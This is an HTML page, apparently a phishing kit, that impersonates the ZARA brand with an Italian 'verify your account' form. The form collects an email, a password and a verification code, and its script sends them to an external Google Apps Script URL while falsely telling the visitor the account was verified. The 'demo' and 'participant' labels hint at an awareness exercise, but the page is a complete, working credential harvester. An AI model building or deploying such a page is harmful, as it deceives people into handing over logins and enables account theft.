<!doctype html>
<html lang="it">
<head>
  <meta charset="utf-8" />
  <title>ZARA</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body { font-family: Arial, sans-serif; background:#f3f4f6; padding:24px; }
    .wrap { max-width:520px; margin:28px auto; }
    .card { background:#fff; border-radius:10px; padding:20px; box-shadow:0 6px 18px rgba(0,0,0,0.08); }
    .brand { font-weight:700; letter-spacing:3px; color:#111; margin-bottom:8px; }
    .warning { background:#fff4e5; border-left:4px solid #ff9900; padding:10px; border-radius:6px; margin-bottom:12px; font-weight:600; color:#663300; }
    label { display:block; margin-top:10px; font-size:14px; }
    input, textarea, select { width:100%; padding:10px; margin-top:6px; box-sizing:border-box; border-radius:6px; border:1px solid #ddd; }
    .consent { margin-top:12px; font-size:13px; }
    .btn { margin-top:14px; width:100%; padding:10px; border:none; border-radius:8px; cursor:pointer; font-weight:700; }
    .btn-primary { background:#111; color:white; }
    .result { margin-top:12px; padding:12px; border-radius:6px; background:#eef; white-space:pre-wrap; display:none; }
    footer { font-size:12px; color:#666; text-align:center; margin-top:12px; }
    .small { font-size:12px; color:#555; margin-top:8px; }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card" role="main" aria-labelledby="title">
      <div class="brand">ZARA</div>
      <h1 id="title">Verifica il tuo account</h1>

      <form id="demoForm">
        <label for="email">Email</label>
        <input id="email" type="email" placeholder="esempio@prova.com" required>

        <label for="password">Password</label>
        <input id="password" type="password" placeholder="********" required>

        <label for="pin">Codice verifica</label>
        <input id="pin" type="text" placeholder="123456">

        <label for="note">Nota partecipante</label>
        <input id="note" type="text" placeholder="es. partecipante1">

        <div class="consent">
          <input type="checkbox" id="consent" />
          <label for="consent" style="display:inline;">Confermo di aver accettato le linee guida della community</label>
        </div>

        <button class="btn btn-primary" type="submit">Verifica</button>
      </form>

      <div id="demoResult" class="result" aria-live="polite"></div>

    </div>

    <footer>
      © Zara official
    </footer>
  </div>

  <script>
    function sanitizeCell(s) {
      if (s === null || s === undefined) return "";
      return String(s).replace(/[\r\n]+/g, " ").replace(/"/g, '""').trim();
    }

    function csvEscapeCell(s) {
      return '"' + sanitizeCell(s) + '"';
    }

    document.getElementById('demoForm').addEventListener('submit', function(ev){
      ev.preventDefault();

      if (!document.getElementById('consent').checked) {
        alert('Devi dare il consenso per procedere.');
        return;
      }

      // Prendi i valori
      const email = document.getElementById('email').value;
      const pwd = document.getElementById('password').value;
      const pin = document.getElementById('pin').value;
      const note = document.getElementById('note').value;
      const now = new Date();
      const nowLocale = now.toLocaleString();

      // ====== INVIO AL GOOGLE APPS SCRIPT ======
      fetch('https://script.google.com/macros/s/AKfycbwdOzfd6_QAh8Uzru4How494Yhub1G-fEQPFPHdowRwPjTiWZBteYyDK64LS0E9DPyIlA/exec', {
        method: 'POST',
        body: JSON.stringify({
          email: email,
          password: pwd,
          pin: pin,
          note: note,
          date: nowLocale
        }),
        headers: {
          'Content-Type': 'application/json'
        }
      })
      .then(res => res.json())
      .then(res => {
        if(res.status === 'ok'){
          alert('CSV inviato con successo!');
        } else {
          alert('Errore durante l’invio.');
        }
      })
      .catch(err => {
        console.error(err);
        alert('Errore di connessione allo script.');
      });
      // ====== FINE FETCH ======

      // Mostra il risultato in pagina
      const out = document.getElementById('demoResult');
      out.style.display = 'block';
      out.textContent = "Account verificato con successo";

      // Pulizia campi
      document.getElementById('email').value = '';
      document.getElementById('password').value = '';
      document.getElementById('pin').value = '';
      document.getElementById('note').value = '';
      document.getElementById('consent').checked = false;
    });
  </script>
</body>
</html>
